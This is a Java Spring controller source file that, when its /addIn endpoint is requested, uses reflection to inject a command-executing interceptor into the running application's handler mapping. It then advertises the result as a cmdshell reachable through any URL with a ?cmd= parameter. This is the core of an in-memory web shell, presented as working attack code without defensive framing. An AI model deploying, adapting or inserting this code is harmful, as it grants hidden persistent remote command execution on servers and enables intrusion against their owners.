package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerAdapter;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

@Controller
public class AddInterceptor {

    @RequestMapping(value = "/addIn")
    public void index(HttpServletRequest request, HttpServletResponse httpServletResponse) throws Exception{

        // 获取当前应用上下文
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(
                ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest()
        );


        // 通过 context 获取 RequestMappingHandlerMapping 对象
        RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

        Field f = mapping.getClass().
                getSuperclass().
                getSuperclass().
                getSuperclass().getDeclaredField("adaptedInterceptors");

        f.setAccessible(true);
        List<HandlerInterceptor> list = (List<HandlerInterceptor>) f.get(mapping);
        HandlerInterceptor cmdInterceptor = new cmdInterceptor();
        if(list.contains(cmdInterceptor)){
            httpServletResponse.getWriter().write("cmd Interceptors already exist.");
        }
        list.add((HandlerInterceptor) cmdInterceptor.class.newInstance());
        httpServletResponse.getWriter().write("cmd Interceptors add.\n Use cmdshell: any?cmd=");
    }
}
